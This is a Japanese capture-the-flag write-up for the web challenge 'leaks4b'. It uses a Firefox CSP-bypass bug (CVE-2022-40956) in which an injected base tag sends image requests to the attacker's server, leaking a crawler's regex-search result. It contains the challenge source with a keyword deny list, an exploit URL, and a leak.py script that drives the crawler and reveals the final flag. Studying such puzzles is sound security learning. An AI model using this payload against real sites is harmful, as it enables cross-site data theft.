{"pageProps":{"postData":{"id":"leaks4b","contentHtml":"# leaks4b\n\n## 問題文\n\nケーキをあいまい検索できます。 どれを注文するか迷ってしまいます！！\\\n`※フラグの形式はTsukuCTF22{[a-z]{7}}です。多数のリクエストを許容する問題ですが、数秒間隔をあけてください。配布されているソースは厳密なものではありません。フラグの提出回数は3回までとなっています。`\\\n[http://133.130.96.134:31416](http://133.130.96.134:31416/)\n\n## 難易度\n\n**hard**\n\n## 作問にあたって\n\n趣味 CTF ということもあり、キモイ問題を出しても良いでしょうということで 1day 問を出しました。\\\nMozilla に早めに報告してしまったので、0day 問ではなくなってしまいました(CVE-2022-40956)。\\\nCSSi や ReDoS を用いたリークなど非想定解が思い浮かびまくり、修正しました。\\\nもし、Firefox の 1day 以外で解かれた方がいましたら Writeup などで教えてくれると嬉しいです。\\\nちなみに Misc の soder はこの非想定解から生まれた問題です。\\\nそして 4b は嘘です。\n\n## 解法\n\nURL とソースが渡される。\\\nアクセスするとケーキを検索できるページのようだ。\\\n![site1.png](images/site1.png)\\\nクローラが設置されており、パティシエが閲覧してくれるようだ。\\\n![site2.png](images/site2.png)\\\nひとまず配布されたソースの app.py を見ると、以下のようであった。\n\n```python\n~~~\ndef cssi_sanitizer(text):\n    # XSS could be mitigated by CSP, but CSSi and ReDoS are dangerous.\n    deny_list = [\"stylesheet\", \"import\", \"image\", \"style\", \"flag\", \"link\", \"img\", \"\\\"\", \"$\", \"'\", \"(\", \")\", \"*\", \"+\", \":\", \";\", \"?\", \"@\", \"[\", \"\\\\\", \"]\", \"^\", \"{\", \"}\"]\n    text = text.lower()\n    if any([hack in text for hack in deny_list]):\n        return \"ハッキングケーキ\"\n    return text\n\nmenu = [\"チョコレートケーキ, チョコケーキ, chocolatecake\", \"チーズケーキ, cheesecake\", \"バナナケーキ, bananacake\"]\n\n~~~\n@app.route(\"/\")\ndef top():\n    cake = request.args.get(\"cake\", \"チョコレートケーキ\")\n    cake = cssi_sanitizer(cake[:100])\n    flag = request.cookies.get(\"flag\")\n    # It is not expected to steal the cookie.\n    # This is \"leaks4b.\"\n    if (flag == FLAG) and (re.findall(cake, FLAG)):\n        img = \"flag0.jpg\"\n    elif re.findall(cake, menu[0]):\n        img = f\"cake0.jpg\"\n    elif re.findall(cake, menu[1]):\n        img = f\"cake1.jpg\"\n    elif re.findall(cake, menu[2]):\n        img = f\"cake2.jpg\"\n    else:\n        img = f\"cake3.jpg\"\n    nonce = secrets.token_urlsafe(16)\n    return f\"\"\"<!doctype html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-{nonce}'; base-uri 'none'; connect-src 'none'; font-src 'none'; form-action 'none'; frame-src 'none'; object-src 'none'; require-trusted-types-for 'script'; worker-src 'none';\">\n    <script src=\"https://cdn.tailwindcss.com\" nonce=\"{nonce}\"></script>\n    <title>Leaks4b</title>\n</head>\n~~~\n\"\"\"\n\n~~~\n@app.route(\"/order\", methods=[\"POST\"])\ndef order_post():\n    url = request.form.get(\"url\", \"____\")\n    if not url.startswith(\"http\"):\n        return \"[ERROR] http and https schemes are allowed.\"\n    try:\n        with sync_playwright() as p:\n            browser = p.firefox.launch()\n            context = browser.new_context()\n            context.add_cookies([{\"name\": \"flag\", \"value\": FLAG, \"httpOnly\": True, \"url\": URL}])\n            page = context.new_page()\n            page.goto(url, timeout=10000)\n            browser.close()\n    except Exception as e:\n        print(e)\n        pass\n    return \"I received your cake order. Have the flag and wait for your cake!\"\n~~~\n```\n\n`?cake=`に入力した文字を正規表現としてケーキを検索している。\\\nフラグも検索できるが、cookie がフラグ文字列と一致している場合にのみ検索可能なようで、クローラ以外には不可能と考えられる。\\\nフラグが検索できた場合に表示される画像は`flag0.jpg`であり、ケーキは`cake0~3.jpg`である。\\\nこの画像にフラグが書かれているのではと予測し、アクセスするが以下の画像が表示されるだけであった。\\\n![flag0.jpg](images/flag0.jpg)\\\n一見すると`?cake=`で任意の HTML タグを差し込め、XSS によってクローラの cookie を取得できそうだが httpOnly であるようだ。\\\nさらに cssi\\_sanitizer と、とんでもなく厳しい CSP により守られており、XSS は愚か CSSi も難しい。\\\n何とかしてクローラのフラグ検索結果の成否をリークしたい。\\\nここでユーザ由来の正規表現を使っているため、ReDoS の可能性もあることに気づく。\\\n幸い CSP に img の制限はないため、自身のドメインを src に設定した img タグを挿入し、アクセスの有無を確認することで ReDoS の応答遅延によってフラグをリークする手法が思い浮かぶ。\\\nしかし cssi\\_sanitizer や文字数制限が邪魔をして、これも難しい。\\\nここで試しによくある手法である base タグを挿入すると、CSP で none であるはずなのになぜか img の src を base の href へ問い合わせることがわかる。\\\nこれによって、CSP をバイパスして img の相対パスがリークできる。\\\nimg の画像ファイル名は検索結果によって異なるためクローラのフラグ検索結果のオラクルになりえる。\\\nあとはフラグに一致する正規表現と base タグを cssi\\_sanitizer を躱してクエリに設定してやればよい。\\\nフラグの`TsukuCTF22{`リークするクエリは以下になる。\n\n```txt\nhttp://133.130.96.134:31416/?cake=.suku...22.|%3Cbase%20href=//[自身のサーバ]%3E\n```\n\nbase タグは`|`で設定し、特殊文字と小文字化に注意する(フラグの`{`などは`.`を利用して任意の一文字として埋めてやればよい)。\\\nリークが行えることがわかったら、`/static/img/flag0.jpg`が来るまで小文字すべてをクローラへ投げてやり、ヒットしたらフラグ文字列に追加し次の文字を探せばよい。\\\n以下の leak.py で行う。\n\n```python\nimport requests\n\nTARGET_URL = \"http://133.130.96.134:31416\"\nLEAK_URL = \"http://[自身のサーバ]\".replace(\"http:\", \"\").replace(\"https:\", \"\")\n\nFLAG = \".suku...22.\"\n\nfor c in \"abcdefghijklmnopqrstuvwxyz.\":\n    res = requests.post(f\"{TARGET_URL}/order\", data={\"url\": f\"{TARGET_URL}/?cake={FLAG}{c}|%3Cbase%20href={LEAK_URL}%3E\"})\n    print(res.text)\n```\n\n実行し、手動でリークした文字を追加していくと flag が得られた(自動化もできるが手動でも可能なような flag になっている)。\n\n## TsukuCTF22{cakeuma}\n","title":"leaks4b","description":"Firefoxの1day問題","author":"Satoki","genre":"Web","solver":3,"point":500}},"__N_SSG":true}